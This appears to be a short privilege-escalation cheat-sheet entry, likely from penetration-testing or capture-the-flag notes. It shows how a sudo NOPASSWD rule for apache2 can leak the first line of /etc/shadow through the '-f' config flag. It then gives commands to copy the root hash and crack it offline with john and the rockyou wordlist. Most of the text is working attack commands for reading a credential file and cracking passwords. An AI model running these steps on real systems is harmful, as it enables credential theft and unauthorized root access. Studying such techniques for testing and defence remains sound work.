- - - 
## (root) NOPASSWD: /usr/sbin/apache2 :
we can't use this to abuse the system and get root.
This is also not available on GTFOBins.
But we can use this to read the first line af any sensitive files.

```sh
sudo apache2 -f /etc/shadow
```

copy the hash. Move to your Local Machine.

```sh
nano hashes
```

paste_your_hash

Then Crack it.

```sh
john --format=sha512crypt --wordlist=/opt/rockyou.txt hashes
```

- - -
